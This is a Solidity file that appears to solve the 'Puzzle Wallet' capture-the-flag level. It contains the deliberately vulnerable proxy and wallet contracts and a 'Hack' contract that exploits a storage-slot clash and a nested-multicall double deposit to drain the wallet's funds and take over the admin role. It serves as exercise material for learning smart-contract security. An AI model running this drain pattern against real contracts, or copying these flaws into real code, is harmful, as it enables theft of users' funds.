// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "./@openzeppelin/contracts/proxy/utils/UpgradableProxy.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "../node_modules/hardhat-console/contracts/console.sol";

/**
Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions 
by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, 
and they also wanted to prevent people from outside the group from using it. 
To do so, they voted and assigned two people with special roles in the system: 
The admin, which has the power of updating the logic of the smart contract. 
The owner, which controls the whitelist of addresses allowed to use the contract. 
The contracts were deployed, and the group was whitelisted. 
Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

  You'll need to hijack this wallet to become the admin of the proxy.

  Things that might help::

Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one.
Knowing about proxy patterns and the way they handle storage variables.

**/

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(address _implementation) 
    UpgradeableProxy(_implementation, "") payable {
        admin = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    using SafeMath for uint256;
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }
    
    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] = balances[msg.sender].add(msg.value);
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] = balances[msg.sender].sub(value);
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

    function single(bytes calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        bytes memory _data = data;
        bytes4 selector;
        assembly {
            selector := mload(add(_data, 32))
        }
        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            // Protect against reusing msg.value
            depositCalled = true;
        }
        (bool success, ) = address(this).delegatecall(_data);
        require(success, "Error while delegating call");
        
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

interface ProxyI {
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function balances(address to) external view returns(uint);

    function multicall(bytes[] calldata data) external payable;
    function single(bytes calldata data) external payable;
    function depositSenderCheck() external payable returns(address);
    function depositValueCheck() external payable returns(uint);
}


contract Hack {

    ProxyI proxy;
    bytes[] data;
    bytes[] mutliCallData;

    constructor(address _proxy) {
        proxy = ProxyI(_proxy);
    }

    function getHackerBalance() public view returns(uint){
        return proxy.balances(address(this));
    }

    function getProxyBalance() public view returns(uint) {
       return address(proxy).balance;
    }


    function hack() public payable {
        require(msg.value == getProxyBalance(), "msg value must be equal to proxy balance"); // we need to make sure we will empty the wallet at end of this hack 
        takeOverAsOwner(); 
        depositTwiceHack();
        withdraw();
        setMaxBalanceSlot();
    }

    function takeOverAsOwner() internal {   
        proxy.proposeNewAdmin(address(this)); // will make you owner of wallet due to storage slot clash
        proxy.addToWhitelist(address(this)); // Now you can add your address to whitelist
    }

    function depositTwiceHack() internal {
        delete data;
        delete mutliCallData;
        data.push(abi.encodeWithSignature("deposit()"));
        // Multicall checks that deposit can be called only once, but doesn't check if multicall itself is called twice and allows multicall to also be called nested
        mutliCallData.push(abi.encodeWithSignature("multicall(bytes[])", data));
        mutliCallData.push(abi.encodeWithSignature("multicall(bytes[])", data));
        (bool result,) = address(proxy).call{value: msg.value}(abi.encodeWithSignature("multicall(bytes[])", mutliCallData));
        require(result, "EERRR");
    }

    function withdraw() internal {
        proxy.execute(tx.origin, getProxyBalance(), "");
    }
     
    function setMaxBalanceSlot() internal {
        proxy.setMaxBalance(uint160(msg.sender)); // will make this address as owner of proxy due to storage slot clash
    }
}